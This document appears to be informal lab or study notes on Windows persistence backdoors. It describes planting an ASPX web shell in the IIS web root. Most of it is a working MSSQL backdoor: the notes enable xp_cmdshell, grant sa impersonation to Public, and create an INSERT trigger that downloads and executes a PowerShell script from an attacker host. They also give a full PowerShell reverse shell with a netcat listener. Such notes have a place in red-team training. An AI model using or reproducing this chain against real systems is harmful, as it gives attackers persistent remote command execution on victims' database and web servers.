If you don't want to use Windows features to hide a backdoor, you can always profit from any existing service that can be used to run code for you

web shells
==
using web shell enable us to launch them with administrative priv even if not from a priv accnt 


:>get shell.aspx and move it to the web root C:\inetpub\wwwroot

:>grant everyone full access to the file 

:>access from browser http://victimip/shell

note blue teams check web dir integrity anything slight change can trigger an alert 

my sql backdoor
==

trigger is like a callback for other events when something happens on the data base e.g launching scripts etc 


:>enable xp_cmdshell and configure it
click new query then 
:>sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

:>sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO

make all users impersonate "sa" which is admin user in data base

:>USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];


:>USE HRDB

Our trigger will leverage xp_cmdshell to execute Powershell to download and run a .ps1 file from a web server controlled by the attacker. The trigger will be configured to execute whenever an INSERT is made into the Employees table of the HRDB database:

:>CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';





note!!!!!!!! the upper was the explanation

this is the code for the sql server

:>
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO

USE master
GRANT IMPERSONATE ON LOGIN::sa to [Public];
GO 
-- ^^ You must place a GO here to end the privilege grant batch

USE HRDB
GO
-- ^^ And it's safest to place a GO here after changing the database context

-- This is the START of the new batch, which ONLY contains the CREATE TRIGGER command.
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://10.9.1.117:8000/evilscript.ps1'')"';
GO
-- ^^ Always end the CREATE statement with GO

:>


Now that the backdoor is set up, let's create evilscript.ps1 in our attacker's machine, which will contain a Powershell reverse shell:

$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()


from attacker machine launch a server and net cat listner ...server to serve the script lisetener to connect 

from website 
http://vicip/ and insert an employee into the web application. Since the web application will send an INSERT statement to the database, our TRIGGER will provide us access to the system's console.

